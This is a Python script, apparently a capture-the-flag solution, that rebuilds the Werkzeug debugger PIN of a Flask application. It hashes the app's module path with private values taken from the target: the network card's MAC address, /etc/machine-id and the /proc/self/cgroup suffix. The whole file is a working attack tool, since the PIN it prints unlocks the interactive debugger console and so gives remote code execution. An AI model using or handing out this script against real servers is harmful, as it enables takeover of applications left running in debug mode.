import hashlib
from itertools import chain

rv, num = None, None

probably_public_bits = [
    'app',
    'flask.app',
    'Flask',
    '/usr/local/lib/python3.8/site-packages/flask/app.py'
]

private_bits = [
    '2485376912269',# str(uuid.getnode()),  /sys/class/net/ens33/address
    '265fe765262551a676151a24c02b7b61e8516a5de551fcf4df6641a14c6b298c86f6f6b6227f421504b00fe9474cae4'# /etc/machine-id的内容+/proc/self/cgroup的结尾
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = f"__wzd{h.hexdigest()[:20]}"

# If we need to generate a pin we salt it a bit more so that we don't
# end up with the same value and generate out 9 digits
if num is None:
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

# Format the pincode in groups of digits for easier remembering if
# we don't have a result yet.
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

print(rv)
